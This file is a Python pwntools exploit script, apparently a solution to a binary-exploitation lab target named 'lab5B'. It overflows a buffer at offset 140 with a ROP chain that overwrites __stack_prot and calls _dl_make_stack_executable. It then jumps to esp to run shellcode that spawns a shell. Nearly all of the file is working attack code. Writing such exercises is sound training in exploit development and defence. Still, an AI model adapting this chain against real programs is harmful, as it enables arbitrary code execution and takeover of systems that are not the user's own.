#!/usr/bin/python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *
import os

# Set up pwntools for the correct architecture
context.update(arch='i386', kernel='amd64')
context.terminal = ['tmux', 'splitw', '-h']  
context.log_level = 'DEBUG'
exe = './lab5B'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x080de6cf
break exit
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()
exe = ELF(exe)

rop = ROP(exe)
rop_it = lambda rop,io : io.sendline(fit({140:rop.chain()}))
pop_eax = rop.find_gadget(["pop eax", "ret"])
pop_edx = rop.find_gadget(["pop edx", "ret"])

payload = asm(shellcraft.sh())
#payload = "\xcc"*4

#Write to __stack_prot
#Might need to change the value
rop.raw(pop_eax.address)
rop.raw(0x7)
rop.raw(pop_edx.address)
rop.raw(exe.sym.__stack_prot)
rop.raw(0x0809a95d) #:mov dword ptr [edx], eax ; ret

#Call _dl_make_stack_executable
rop.raw(pop_eax.address)
rop.raw(exe.sym.__libc_stack_end)
rop.call(exe.sym._dl_make_stack_executable)
rop.raw(0x080de6cf) #: jmp esp
rop.raw(0x90909090) # NOP sled
rop.raw(payload)
print(rop.dump())


rop_it(rop,io)


io.interactive()

